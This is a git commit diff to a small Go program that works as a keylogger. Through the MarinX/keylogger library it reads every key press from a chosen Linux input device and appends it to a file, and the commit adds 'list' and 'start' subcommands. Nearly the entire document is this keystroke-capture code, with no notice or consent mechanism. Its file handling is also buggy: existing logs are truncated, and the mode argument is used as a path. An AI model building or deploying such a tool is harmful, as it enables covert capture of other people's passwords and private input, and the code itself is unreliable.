8aa836d667c51d4ea24cff5b591ce228bdc6ccee
namithubot <namithubot@gmail.com>
2017-01-30 22:14:52 +0530

    Added specs

--- logging.go
+++ logging.go
@@ -3,46 +3,92 @@ import(
 	"fmt"
 	"log"
 	"os"
+	"strconv"
 	"github.com/MarinX/keylogger"
 )
 
-func main(){
-//	Let's prepare the file
-	f, err := os.OpenFile("~/.keylogged", os.O_APPEND|os.O_WRONLY, 0600)
-	if err != nil {
-    		panic(err)
-	}
-	defer f.Close()
-
-	//I've got devices!
+func listDevices(){
 	ndevices, err := keylogger.NewDevices()
 	if err != nil {
 		log.Fatal("Error:",err)
 		return
 	}
 	for _, eachDev := range ndevices {
-		fmt.Println("Id->", eachDev.Id,"Name:", eachDev.Name)
+		fmt.Println("Id:", eachDev.Id,"Name:", eachDev.Name)
 	}
+}
+
+func startLogging(){
+//	Let's prepare the file
+	var logfile *os.File
+	var err error
+	if len(os.Args)==5 {
+		if os.Args[4]=="0"{
+			logfile, err = os.Create(os.Args[3])
+			if err != nil {
+				panic(err)
+			}
+		} else {
+		if _, err = os.Stat(os.Args[3]); err == nil {
+ 			logfile, err = os.Create(os.Args[3])
+		} else {
+		logfile, err = os.OpenFile(os.Args[4], os.O_APPEND|os.O_WRONLY, 0600)
+			if err != nil {
+				panic(err)
+			}
+		}
+		}
+	}
+	defer logfile.Close()
+
+	//I've got devices!
+	ndevices, err := keylogger.NewDevices()
 	//Index value to be set to keyboard, mind it!
-	rd := keylogger.NewKeyLogger(ndevices[0])
-	in, err := rd.Read()
+	ind, _ := strconv.Atoi(os.Args[2])
+	reader := keylogger.NewKeyLogger(ndevices[ind])
+	input, err := reader.Read()
 	if err!= nil {
 		log.Fatal("Error:", err)
 		return
 	}
 
-	for i := range in {
+	for aStroke := range input {
 	//listen only key stroke event
 
-  	if i.Type == keylogger.EV_KEY {
+  	if aStroke.Type == keylogger.EV_KEY {
 	//Get the key value
-    	b := i.KeyString()
+    	b := aStroke.KeyString()
 	//Write it to the file
-	if _, err = f.WriteString(b); err != nil {
+	if _, err = logfile.WriteString(b); err != nil {
     	panic(err)
 	}
 	}
-
+	}
 }
 
+func printHelp(){
+	fmt.Println("Available arguments are list and start")
+	fmt.Println("Usage logging [list/start] [indexOfTheDevice logFilePath] [mode]")
+	fmt.Println("Mode 0: To start over, Else: Append")
+}
+
+func main(){
+//	args := os.Args
+	if len(os.Args) < 2 {
+		printHelp()
+		return
+	}
+	if os.Args[1]=="list" {
+		listDevices()
+		return
+	}
+	if len(os.Args) < 4 {
+		printHelp()
+		return
+	}
+	if os.Args[1]=="start" {
+		startLogging()
+	} else {
+		printHelp()
+	}
 }
